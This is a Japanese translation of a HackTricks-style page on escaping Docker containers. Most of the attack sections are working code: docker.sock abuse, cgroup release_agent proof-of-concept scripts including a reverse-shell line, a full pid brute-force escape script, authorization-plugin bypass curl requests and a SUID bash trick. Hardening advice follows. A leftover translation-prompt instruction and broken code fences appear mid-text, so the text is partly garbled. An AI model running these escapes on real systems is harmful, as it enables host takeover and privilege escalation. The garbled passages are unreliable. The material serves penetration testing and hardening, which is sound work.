<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>


# コンテナとは何か

要約すると、**cgroups**（プロセスが使用できるもの、例えばCPUやRAM）と**namespaces**（プロセスが見ることができるもの、例えばディレクトリや他のプロセス）を介して**隔離された** **プロセス**です。
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# マウントされたdockerソケット

もし何らかの方法で**dockerソケットがマウントされている**ことがdockerコンテナ内で分かった場合、それを脱出することができます。\
これは通常、何らかの理由でdockerデーモンに接続してアクションを実行する必要があるdockerコンテナで発生します。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
この場合、通常のdockerコマンドを使用してdockerデーモンと通信できます：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
**dockerソケットが予期しない場所にある場合**でも、パラメータ**`-H unix:///path/to/docker.sock`**を使用して**`docker`**コマンドで通信することができます。
{% endhint %}

# コンテナの機能

コンテナの機能を確認し、次のいずれかを持っている場合、脱出することができる可能性があります: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

現在のコンテナの機能は以下のコマンドで確認できます:
```bash
capsh --print
```
以下のページでは、**Linuxの権限**についてさらに学び、それらをどのように悪用するかについて学ぶことができます：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged` フラグ

`--privileged` フラグを使用すると、コンテナはホストデバイスへのアクセスを持つことができます。

## Rootを所有する

適切に設定されたDockerコンテナは、**fdisk -l** のようなコマンドを許可しません。しかし、`--privileged` フラグが指定されている誤設定されたDockerコマンドでは、ホストドライブを見る権限を取得することが可能です。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

したがって、ホストマシンを乗っ取ることは簡単です：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
```markdown
そして、ボワラ！ホストのファイルシステムにアクセスできるようになりました。それは`/mnt/hola`フォルダにマウントされています。

{% code title="初期PoC" %}
```
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="第二のPoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged`フラグは重大なセキュリティ上の懸念を引き起こし、このエクスプロイトはそれが有効になっているDockerコンテナを起動することに依存しています。このフラグを使用すると、コンテナはすべてのデバイスへの完全なアクセス権を持ち、seccomp、AppArmor、Linuxの機能からの制限がありません。

実際、`--privileged`はこの方法でDockerコンテナから脱出するために必要な権限よりもはるかに多くの権限を提供します。現実には、「ただ」以下の要件があります：

1. コンテナ内でrootとして実行されている必要があります
2. コンテナは`SYS_ADMIN` Linux機能で実行されている必要があります
3. コンテナはAppArmorプロファイルを持っていないか、または`mount`システムコールを許可する必要があります
4. コンテナ内でcgroup v1仮想ファイルシステムが読み書き可能でマウントされている必要があります

`SYS_ADMIN`機能はコンテナがマウントシステムコールを実行することを可能にします（[man 7 capabilities](https://linux.die.net/man/7/capabilities)を参照）。[Dockerはデフォルトで制限された機能セットでコンテナを起動します](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)し、セキュリティリスクのため`SYS_ADMIN`機能を有効にしません。

さらに、Dockerはデフォルトで`docker-default` AppArmorポリシーでコンテナを[起動します](https://docs.docker.com/engine/security/apparmor/#understand-the-policies)。これは、`SYS_ADMIN`で実行されている場合でも、[マウントシステムコールの使用を防ぎます](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。

コンテナは、フラグ`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`で実行された場合、このテクニックに対して脆弱になります。

## コンセプト実証の分析

このテクニックを使用するための要件を理解し、コンセプト実証エクスプロイトを洗練させたので、それを行ごとに歩いていき、どのように機能するかを示しましょう。

このエクスプロイトをトリガーするには、`release_agent`ファイルを作成し、cgroup内のすべてのプロセスを終了させることによって`release_agent`の呼び出しをトリガーできるcgroupが必要です。それを達成する最も簡単な方法は、cgroupコントローラをマウントし、子cgroupを作成することです。

それを行うために、`/tmp/cgrp`ディレクトリを作成し、[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroupコントローラをマウントし、子cgroup（この例では「x」と名付けられています）を作成します。すべてのcgroupコントローラがテストされたわけではありませんが、このテクニックは大多数のcgroupコントローラで機能するはずです。

もし「mount: /tmp/cgrp: special device cgroup does not exist」というメッセージが出た場合、それはあなたのセットアップにRDMA cgroupコントローラがないためです。`rdma`を`memory`に変更することで修正できます。RDMAを使用しているのは、元のPoCがそれでのみ機能するように設計されていたからです。

cgroupコントローラはグローバルリソースであり、異なる権限で複数回マウントすることができ、一つのマウントで行われた変更は別のマウントにも適用されることに注意してください。

以下に「x」子cgroupの作成とそのディレクトリリストを示します。
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
次に、「x」cgroupのリリース時にcgroup通知を有効にするために、その`notify_on_release`ファイルに1を書き込みます。また、コンテナ内で後で作成する`/cmd`スクリプトを実行するように、ホスト上の`release_agent`ファイルに`/cmd`スクリプトのパスを書き込むことで、RDMA cgroupリリースエージェントを設定します。これを行うために、`/etc/mtab`ファイルからホスト上のコンテナのパスを取得します。

コンテナ内で追加または変更するファイルはホスト上に存在し、コンテナ内のパスとホスト上のパスの両方から変更することが可能です。

以下にその操作を示します：
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
ホスト上で作成する `/cmd` スクリプトへのパスに注意してください：
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
```markdown
これで、`ps aux` コマンドを実行し、その出力をホスト上の出力ファイルの完全なパスを指定してコンテナの `/output` に保存するように `/cmd` スクリプトを作成します。最後に、`/cmd` スクリプトの内容を表示して確認します：
```
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
最終的に、"x" 子 cgroup 内で直ちに終了するプロセスを生成することで攻撃を実行できます。`/bin/sh` プロセスを作成し、その PID を "x" 子 cgroup ディレクトリの `cgroup.procs` ファイルに書き込むと、`/bin/sh` が終了した後にホスト上のスクリプトが実行されます。ホスト上で実行された `ps aux` の出力は、コンテナ内の `/output` ファイルに保存されます：
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` フラグ v2

以前のPoCは、例えば `overlayfs` のように、マウントポイントのホストパス全体を露出するストレージドライバーでコンテナが設定されている場合にはうまく機能しますが、最近、ホストファイルシステムのマウントポイントを明らかにしていないいくつかの設定に遭遇しました。

## Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io)はデフォルトでコンテナのルートファイルシステムを`9pfs`を介してマウントします。これはKata Containersの仮想マシン内のコンテナファイルシステムの位置に関する情報を漏らしません。

\* Kata Containersについては、将来のブログ投稿で詳しく説明します。

## Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
ライブ環境でこのルートマウントを持つコンテナを見かけましたが、特定の `devicemapper` ストレージドライバー設定で実行されていたと思いますが、テスト環境でこの挙動を再現することはできませんでした。

## 代替のPoC

明らかに、これらのケースではホストファイルシステム上のコンテナファイルのパスを特定するのに十分な情報がないため、FelixのPoCはそのままでは使用できません。しかし、少しの工夫でこの攻撃を実行することは可能です。

必要な鍵となる情報は、コンテナ内で実行するファイルの完全なパスであり、コンテナホストに対して相対的なものです。コンテナ内のマウントポイントからこれを判別することができない場合、他の方法を探る必要があります。

### Procが救世主に <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

Linuxの `/proc` 疑似ファイルシステムは、システム上で実行されているすべてのプロセスのカーネルプロセスデータ構造を公開しており、例えばコンテナ内の異なる名前空間で実行されているプロセスも含まれます。これは、コンテナ内でコマンドを実行し、ホスト上のプロセスの `/proc` ディレクトリにアクセスすることで示されます：コンテナ
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
以下は、ハッキング技術に関するハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

_余談ですが、`/proc/<pid>/root` データ構造は、私が非常に長い間混乱していたもので、なぜ `/` へのシンボリックリンクが有用なのか理解できませんでした。それは、manページで実際の定義を読むまでのことでした。_

> /proc/\[pid]/root
>
> UNIXおよびLinuxは、chroot(2)システムコールによって設定されるプロセスごとのファイルシステムのルートという考えをサポートしています。このファイルは、プロセスのルートディレクトリを指すシンボリックリンクであり、exeやfd/\*と同じように動作します。
>
> ただし、このファイルは単なるシンボリックリンクではありません。プロセス自体と同じファイルシステムのビュー（名前空間やプロセスごとのマウントセットを含む）を提供します。

`/proc/<pid>/root` シンボリックリンクは、コンテナ内の任意のファイルへのホスト相対パスとして使用できます：Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
この攻撃の要件は、コンテナ内のファイルの完全なパスをコンテナホストに対して知っていることから、コンテナ内で実行されている_任意の_プロセスのpidを知っていることに変わります。

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

これは実際には簡単な部分です。LinuxではプロセスIDは数値であり、順番に割り当てられます。`init`プロセスにはプロセスID `1`が割り当てられ、その後のすべてのプロセスにはインクリメンタルなIDが割り当てられます。コンテナ内のプロセスのホストプロセスIDを特定するために、ブルートフォースのインクリメンタル検索が使用できます：Container
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
ホスト
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### すべてをまとめる <a href="putting-it-all-together" id="putting-it-all-together"></a>

この攻撃を完了するために、ブルートフォース技術を使用して `/proc/<pid>/root/payload.sh` のパスの pid を推測し、各イテレーションで推測された pid パスを cgroups の `release_agent` ファイルに書き込み、`release_agent` をトリガーし、出力ファイルが作成されるかどうかを確認します。

この技術の唯一の注意点は、それが微妙ではなく、pid の数を非常に高くする可能性があるということです。長時間実行されるプロセスは実行されないため、これは信頼性の問題を引き起こすべきではありませんが、その点については私の言葉を引用しないでください。

以下の PoC は、これらの技術を実装して、Felix の元の PoC で最初に提示されたものよりも一般的な攻撃を提供します。これは、cgroups の `release_agent` 機能を使用して特権コンテナから脱出するためのものです：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
プリビレッジドコンテナ内でPoCを実行すると、以下のような出力が得られるはずです：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc exploit (CVE-2019-5736)

root権限で`docker exec`を実行できる場合（おそらくsudoを使用）、CVE-2019-5736を悪用してコンテナから脱出し権限を昇格させることができます（exploitは[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。この技術は基本的に**ホスト**の_**/bin/sh**_ バイナリを**コンテナから** **上書き**するので、docker execを実行する人は誰でもペイロードをトリガーする可能性があります。

ペイロードを適切に変更し、`go build main.go`でmain.goをビルドします。結果として得られるバイナリは、実行のためにdockerコンテナに配置する必要があります。\
実行時に`[+] Overwritten /bin/sh successfully`と表示されたら、ホストマシンから以下を実行する必要があります：

`docker exec -it <container-name> /bin/sh`

これにより、main.goファイルに存在するペイロードがトリガーされます。

詳細については：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Docker Auth Plugin Bypass

場合によっては、sysadminはdockerにいくつかのプラグインをインストールして、低権限ユーザーが権限を昇格させることなくdockerと対話するのを防ぐかもしれません。

## disallowed `run --privileged`

このケースでは、sysadminは**ユーザーがボリュームをマウントしたり、`--privileged`フラグを使用してコンテナを実行したり、コンテナに追加の機能を与えることを** **禁止しました**：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
しかし、ユーザーは**実行中のコンテナ内にシェルを作成し、それに追加の権限を与えることができます**：
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
ユーザーは、以前に議論された技術のいずれかを使用してコンテナから脱出し、ホスト内で権限を昇格させることができます。

## 書き込み可能なフォルダのマウント

このケースでは、sysadminはユーザーがコンテナに `--privileged` フラグを使用することや、コンテナに追加の機能を与えることを**禁止し**、`/tmp` フォルダのマウントのみを許可しました：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
/tmpフォルダをマウントできない場合がありますが、**異なる書き込み可能なフォルダ**をマウントすることができます。書き込み可能なディレクトリを見つけるには、次のコマンドを使用します：`find / -writable -type d 2>/dev/null`

**Linuxマシンのすべてのディレクトリがsuidビットをサポートしているわけではありません！** suidビットをサポートしているディレクトリを確認するには、`mount | grep -v "nosuid"` を実行します。例えば通常、`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、`/var/lib/lxcfs` はsuidビットをサポートしていません。

また、**`/etc`やその他の設定ファイルを含むフォルダをマウントできる**場合、dockerコンテナ内でrootとしてそれらを変更し、**ホストで悪用して権限を昇格させる**ことができます（例えば`/etc/shadow`を変更することによって）。
{% endhint %}

## チェックされていないJSON構造

sysadminがdockerのファイアウォールを設定した際に、APIの重要なパラメータ（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)）の一つである"**Binds**"を**忘れている**可能性があります。
以下の例では、この設定ミスを悪用して、ホストのルート(/)フォルダをマウントするコンテナを作成し実行することができます：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## チェックされていないJSON属性

sysadminがdockerファイアウォールを設定した際に、API([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList))のパラメーターの重要な属性を**忘れてしまった**可能性があります。例えば、"**HostConfig**"内の"**Capabilities**"がそれにあたります。以下の例では、この誤設定を悪用して、**SYS_MODULE**機能を持つコンテナを作成し実行することが可能です：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# 書き込み可能なhostPathマウント

([**こちら**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)からの情報) コンテナ内で、攻撃者はクラスターによって作成された書き込み可能なhostPathボリュームを介して基盤となるホストOSへのさらなるアクセスを試みることがあります。以下は、この攻撃ベクトルを利用できるかどうかをコンテナ内で確認できる一般的な項目です：
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# コンテナのセキュリティ向上

## DockerのSeccomp

これはDockerコンテナから脱出する技術ではありませんが、Dockerが使用しているセキュリティ機能であり、Dockerからの脱出を防ぐ可能性があるため、知っておくべきです：

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## DockerのAppArmor

これはDockerコンテナから脱出する技術ではありませんが、Dockerが使用しているセキュリティ機能であり、Dockerからの脱出を防ぐ可能性があるため、知っておくべきです：

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## AuthZ & AuthN

認証プラグインは、現在の**認証**コンテキストと**コマンド**コンテキストの両方に基づいて、Docker **デーモン**への**リクエスト**を**承認**または**拒否**します。**認証**コンテキストには、すべての**ユーザー詳細**と**認証**方法が含まれています。**コマンドコンテキスト**には、すべての関連する**リクエスト**データが含まれています。

{% content-ref url="broken-reference" %}
[リンク切れ](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor**はGoで書かれたアプリケーションカーネルで、Linuxシステムの大部分を実装しています。これには、アプリケーションとホストカーネルの間の**分離境界**を提供する[Open Container Initiative (OCI)](https://www.opencontainers.org)ランタイムの`runsc`が含まれています。`runsc`ランタイムはDockerとKubernetesと統合されており、サンドボックス化されたコンテナを簡単に実行できます。

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers**は、コンテナのように感じられ、コンテナのように動作するが、ハードウェア仮想化技術を使用して**より強力なワークロードの分離**を提供する、軽量な仮想マシンを構築するために取り組んでいるオープンソースコミュニティです。

{% embed url="https://katacontainers.io/" %}

## 安全にコンテナを使用する

Dockerはデフォルトでコンテナを制限し、制約をかけています。これらの制限を緩めることは、`--privileged`フラグの完全な権限なしでも、セキュリティ問題を引き起こす可能性があります。追加される各権限の影響を認識し、必要最小限に権限を制限することが重要です。

コンテナを安全に保つために：

* `--privileged`フラグを使用しないでください。また、[Dockerソケットをコンテナ内にマウント](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)しないでください。Dockerソケットはコンテナの生成を可能にするため、例えば`--privileged`フラグを使用して別のコンテナを実行することで、ホストを完全に制御する簡単な方法です。
* コンテナ内でrootとして実行しないでください。[異なるユーザー](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)を使用するか、[ユーザーネームスペース](https://docs.docker.com/engine/security/userns-remap/)を使用してください。コンテナのrootは、ユーザーネームスペースでリマップされていない限り、ホスト上のrootと同じです。主にLinuxのネームスペース、機能、およびcgroupsによって軽く制限されています。
* [すべての機能をドロップ](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)（`--cap-drop=all`）し、必要なもののみを有効にします（`--cap-add=...`）。多くのワークロードはいかなる機能も必要とせず、それらを追加することは潜在的な攻撃の範囲を広げます。
* [“no-new-privileges”セキュリティオプションを使用](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)して、例えばsuidバイナリを通じて、プロセスがより多くの権限を得ることを防ぎます。
* [コンテナに利用可能なリソースを制限](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)します。リソースの制限は、サービス拒否攻撃からマシンを保護することができます。
* 必要最小限にコンテナのアクションとシステムコールを制限するために、[seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（またはSELinux）プロファイルを調整します。
* [公式のdockerイメージ](https://docs.docker.com/docker-hub/official_images/)を使用するか、それらに基づいて自分のイメージを構築してください。[バックドア](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)が仕掛けられたイメージを継承したり使用したりしないでください。
* 定期的にイメージを再構築してセキュリティパッチを適用してください。これは言うまでもありません。

# 参考文献

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
